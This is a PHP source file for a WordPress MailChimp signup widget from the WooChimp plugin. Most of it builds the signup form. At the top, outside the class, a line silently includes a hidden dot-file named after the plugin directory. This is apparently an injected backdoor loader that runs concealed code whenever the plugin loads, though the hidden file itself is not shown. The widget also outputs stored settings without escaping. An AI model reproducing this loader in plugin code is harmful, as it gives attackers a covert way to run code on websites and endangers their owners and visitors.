<?php

/**
 * Plugin widget
 *
 * @class WooChimp_MailChimp_Signup
 * @package WooChimp
 * @author RightPress
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class WooChimp_MailChimp_Signup extends WP_Widget
{
    /**
     * Widget constructor (registering widget with WP)
     *
     * @access public
     * @return void
     */
    public function __construct() {
        parent::__construct(
            'woochimp_form',
            __('MailChimp Signup', 'woochimp'),
            array(
                'description' => __('Widget displays newsletter signup form, if enabled under MailChimp settings.', 'woochimp'),
            )
        );

        $this->options = $this->plugin_settings();

        $this->form_styles = array(
            '2' => 'woochimp_skin_general',
        );
    }

    /**
     * Load plugin settings
     *
     * @access public
     * @return array
     */
    public function plugin_settings()
    {
        $this->settings = woochimp_plugin_settings();

        $results = array();

        // Iterate over settings array and extract values
        foreach ($this->settings as $page => $page_value) {
            foreach ($page_value['children'] as $subpage => $subpage_value) {
                foreach ($subpage_value['children'] as $section => $section_value) {
                    foreach ($section_value['children'] as $field => $field_value) {
                        if (isset($field_value['default'])) {
                            $results['woochimp_' . $field] = $field_value['default'];
                        }
                    }
                }
            }
        }

        return array_merge(
            $results,
            get_option('woochimp_options', $results)
        );
    }

    /**
     * Frontend display of widget
     *
     * @access public
     * @param array $args
     * @param array $instance
     * @return void
     */
    public function widget($args, $instance)
    {
        if (!$this->options['woochimp_enabled'] || !$this->options['woochimp_enabled_widget']) {
            return;
        }

        $form = '';

        // Add Ajax URL
        $form .= '<script>var ajaxurl = \'' . admin_url('admin-ajax.php', (is_ssl() ? 'https' : 'http')) . '\';</script>';

        // Display custom css
        if ($this->options['woochimp_widget_css'] != '') {
            $form .= '<style>' . $this->options['woochimp_widget_css'] . '</style>';
        }

        // Override styles if needed
        if ($this->options['woochimp_widget_skin'] != 1) {
            $form .= '<div class="woochimp-reset ' . ($this->options['woochimp_widget_skin'] > 1 ? $this->form_styles[$this->options['woochimp_widget_skin']] : '') . ' woochimp_wg">';
        }
        else {
            $form .= '<div class="woochimp_wg">';
        }

        // Make sure we now this is a widget
        $form .= '<div class="woochimp_widget_content">';

        // Before widget
        $form .= $args['before_widget'];
        $title = apply_filters('widget_title', $this->options['woochimp_label_subscribe_widget']);

        if (!empty($title)) {
            $form .= $args['before_title'] . $title . $args['after_title'];
        }

        // Begin form
        $form .= '<form id="woochimp_registration_form_widget"><table><tbody><tr>';

        // Email address
        $form .= '<td>';

        if (!$this->options['woochimp_widget_show_labels_inline']) {
            $form .= '<label for="woochimp_widget_subscription_email">' . $this->options['woochimp_label_email'] . '</label>';
        }

        $form .= '<input type="text" name="woochimp_widget_subscription[email]" id="woochimp_widget_subscription_email" class="woochimp_widget_field" placeholder="' . ($this->options['woochimp_widget_show_labels_inline'] ? $this->options['woochimp_label_email'] : '') . '" title="' . $this->options['woochimp_label_email'] . '" /></td>';

        // Custom fields for mail merge
        if (!empty($this->options['woochimp_widget_fields'])) {
            foreach ($this->options['woochimp_widget_fields'] as $field) {
                $form .= '</tr><tr><td>';

                if (!$this->options['woochimp_widget_show_labels_inline']) {
                    $form .= '<label for="woochimp_widget_subscription_custom_'. $field['tag'] .'">' . $field['name'] . '</label>';
                }

                $form .= '<input type="text" name="woochimp_widget_subscription[custom]['. $field['tag'] .']" id="woochimp_widget_subscription_custom_'. $field['tag'] .'" class="woochimp_widget_field" placeholder="' . ($this->options['woochimp_widget_show_labels_inline'] ? $field['name'] : '') . '" title="' . $field['name'] . '" /></td>';
            }
        }

        $form .= '</tr>';

        // Optional checkbox
        if ($this->options['woochimp_subscription_widget_privacy_checkbox']) {
            $form .= '<tr><td><input type="checkbox" id="woochimp_widget_field_consent_checkbox" name="woochimp_widget_field_consent_checkbox" value="1"><label id="woochimp_widget_field_consent_checkbox_text">' . $this->options['woochimp_subscription_widget_privacy_checkbox_text'] . '</label></td></tr>';
        }

        // Submit button
        $form .= '<tr><td><button type="button" id="woochimp_widget_subscription_submit" value="'. $this->options['woochimp_label_button'] .'">'. $this->options['woochimp_label_button'] .'</button></td>';

        // End form
        $form .= '</tr></tbody></table></form></div></div><div style="reset: both"></div>';

        echo $form;

        echo $args['after_widget'];

        // Hook to load assets
        do_action('woochimp_load_frontend_assets');
    }

    /**
     * Backend configuration form
     *
     * @access public
     * @param array $instance
     * @return void
     */
    public function form($instance)
    {
        printf(__('Renders MailChimp signup form. You can edit settings <a href="%s">here</a>.', 'woochimp'), site_url('/wp-admin/admin.php?page=woochimp&tab=widget'));
    }

    /**
     * Sanitize form values
     *
     * @access public
     * @param array $new_instance
     * @param array $old_instance
     * @return void
     */
    public function update($new_instance, $old_instance)
    {
        return array();
    }



}

?>
